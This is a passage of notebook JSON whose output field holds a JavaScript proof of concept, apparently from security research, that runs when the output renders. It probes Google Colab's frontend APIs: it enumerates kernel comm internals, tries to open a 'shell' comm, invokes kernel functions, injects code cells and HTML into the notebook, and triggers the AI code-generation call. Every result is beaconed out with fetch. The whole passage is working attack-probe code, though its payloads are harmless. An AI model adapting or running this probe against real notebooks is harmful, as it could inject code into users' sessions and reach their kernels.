            "application/javascript": "\n(async function poc7() {\n  const B = 'https://colab.research.google.com/__poc7';\n  const log = async (tag, val) => {\n    try {\n      await fetch(B + '/' + tag + '?v=' + encodeURIComponent(String(val).slice(0, 500)));\n    } catch(e) {}\n  };\n\n  await log('start', location.host + '|' + Date.now());\n\n  // TEST COMMS: deep probe of kernel.comms\n  try {\n    const comms = window.google.colab.kernel.comms;\n    await log('COMMS_type', typeof comms);\n    await log('COMMS_own', Object.getOwnPropertyNames(comms).join(',') || 'empty');\n    const proto = Object.getPrototypeOf(comms);\n    await log('COMMS_proto_own', proto ? Object.getOwnPropertyNames(proto).join(',') : 'null');\n    const proto2 = proto ? Object.getPrototypeOf(proto) : null;\n    await log('COMMS_proto2', proto2 ? Object.getOwnPropertyNames(proto2).join(',') : 'null');\n\n    // Try to open a comm channel - Jupyter comm protocol\n    // Standard API: comms.open(targetName, data, metadata, buffers)\n    if (typeof comms.open === 'function') {\n      try {\n        const comm = await comms.open('shell', {}, {});\n        await log('COMMS_open_result', JSON.stringify(comm).slice(0, 300));\n      } catch(e) { await log('COMMS_open_err', e.name + '|' + e.message); }\n    }\n\n    // Try registerTarget if it exists\n    if (typeof comms.registerTarget === 'function') {\n      try {\n        comms.registerTarget('poc7_target', (comm, msg) => {});\n        await log('COMMS_registerTarget', 'no_throw');\n      } catch(e) { await log('COMMS_registerTarget_err', e.name + '|' + e.message); }\n    }\n\n    // Enumerate all enumerable + non-enumerable keys\n    const allKeys = [];\n    let obj = comms;\n    while (obj && obj !== Object.prototype) {\n      Object.getOwnPropertyNames(obj).forEach(k => { if (!allKeys.includes(k)) allKeys.push(k); });\n      obj = Object.getPrototypeOf(obj);\n    }\n    await log('COMMS_all_keys', allKeys.join(','));\n\n  } catch(e) { await log('COMMS_threw', e.name + '|' + e.message); }\n\n  // TEST INVOKE: kernel.invokeFunction - actual call attempt\n  try {\n    const fn = window.google.colab.kernel.invokeFunction;\n    await log('INVOKE_type', typeof fn);\n    await log('INVOKE_length', fn.length);\n    // Try calling it - expect \"not allowed to communicate\" error\n    // But the error message itself is diagnostic\n    try {\n      const result = await window.google.colab.kernel.invokeFunction('poc7_probe', [], {});\n      await log('INVOKE_result', JSON.stringify(result).slice(0, 300));\n    } catch(e) { await log('INVOKE_call_err', e.name + '|' + e.message); }\n  } catch(e) { await log('INVOKE_threw', e.name + '|' + e.message); }\n\n  // TEST DISCONNECT: kernel.disconnect\n  try {\n    const disc = window.google.colab.kernel.disconnect;\n    await log('DISC_type', typeof disc);\n    // Do NOT call it - would kill the session\n  } catch(e) { await log('DISC_threw', e.message); }\n\n  // TEST ADDCELL: notebook.addCell - actual call with code content\n  try {\n    const addCell = window.google.colab.notebook.addCell;\n    await log('ADDCELL_type', typeof addCell);\n    await log('ADDCELL_length', addCell.length);\n    await log('ADDCELL_src', addCell.toString().slice(0, 300));\n\n    // Try calling with different signatures Colab might expect\n    // Attempt 1: {type, text}\n    try {\n      const r1 = await window.google.colab.notebook.addCell({type: 'code', text: 'print(\"poc7_injected\")'});\n      await log('ADDCELL_call1_result', JSON.stringify(r1).slice(0, 200));\n    } catch(e) { await log('ADDCELL_call1_err', e.name + '|' + e.message); }\n\n    // Attempt 2: ('code', 'print(\"poc7_injected\")')\n    try {\n      const r2 = await window.google.colab.notebook.addCell('code', 'print(\"poc7_injected\")');\n      await log('ADDCELL_call2_result', JSON.stringify(r2).slice(0, 200));\n    } catch(e) { await log('ADDCELL_call2_err', e.name + '|' + e.message); }\n\n  } catch(e) { await log('ADDCELL_threw', e.name + '|' + e.message); }\n\n  // TEST GENWITHVAR: notebook.generateWithVariable - AI codegen surface\n  try {\n    const gwv = window.google.colab.notebook.generateWithVariable;\n    await log('GWV_type', typeof gwv);\n    await log('GWV_length', gwv.length);\n    await log('GWV_src', gwv.toString().slice(0, 300));\n    // Try calling - might trigger AI code gen dialog or kernel comm\n    try {\n      const r = await window.google.colab.notebook.generateWithVariable('x', 'describe x');\n      await log('GWV_result', JSON.stringify(r).slice(0, 200));\n    } catch(e) { await log('GWV_err', e.name + '|' + e.message); }\n  } catch(e) { await log('GWV_threw', e.name + '|' + e.message); }\n\n  // TEST RENDEROUT: output.renderOutput - inject into output areas\n  try {\n    const ro = window.google.colab.output.renderOutput;\n    await log('RENDER_type', typeof ro);\n    await log('RENDER_src', ro.toString().slice(0, 300));\n    try {\n      const r = await window.google.colab.output.renderOutput(\n        {data: {'text/html': '<b>poc7_render_test</b>'}, metadata: {}}, null\n      );\n      await log('RENDER_result', JSON.stringify(r).slice(0, 200));\n    } catch(e) { await log('RENDER_err', e.name + '|' + e.message); }\n  } catch(e) { await log('RENDER_threw', e.name + '|' + e.message); }\n\n  // TEST PAUSEOUT: output.pauseOutputUntil - might hold a promise that lets us observe\n  try {\n    const po = window.google.colab.output.pauseOutputUntil;\n    await log('PAUSE_type', typeof po);\n    await log('PAUSE_src', po.toString().slice(0, 300));\n  } catch(e) { await log('PAUSE_threw', e.message); }\n\n  await log('done', Date.now());\n})();\n",
